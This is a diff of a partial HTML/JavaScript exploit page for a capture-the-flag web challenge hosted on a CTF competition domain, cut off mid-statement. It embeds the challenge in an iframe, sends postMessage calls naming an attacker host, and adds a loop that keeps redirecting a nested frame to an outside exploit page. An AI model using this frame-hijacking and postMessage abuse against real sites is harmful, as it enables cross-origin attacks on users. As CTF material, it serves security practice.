@@ -2,12 +2,25 @@
 <iframe id="idframe" src="https://sappy-web.2024.ctfcompetition.com/sap.html" onload=onloadpwn() sandbox="allow-scripts"></iframe>
 
 <script>
+    //pseudo code
+    setTimeout(function(){ exp(); }, 6000);
+
+    function exp(){
+        //needs to modify this every 0.1s as it's not clear when the iframe of the iframe affected is created 
+        setInterval(function(){ 
+            window.frames[0].frame[0][2].location="https://geekycat.in/exploit.html";
+        }, 100);
+    }
+
     let pwn_url = "https://pwn.com";
     function onloadpwn() {
         console.log('onloading...');
         let iframe = document.getElementById('idframe');
         iframe.contentWindow.postMessage(
-            JSON.stringify({"method": "initialize", "host": pwn_url}),
+            JSON.stringify({
+                "method": "initialize"
+                // "host": pwn_url
+            }),
             '*');
         // iframe.contentWindow.postMessage({"method": "render", "host": pwn_url},'*');
         const msg = JSON.stringify({
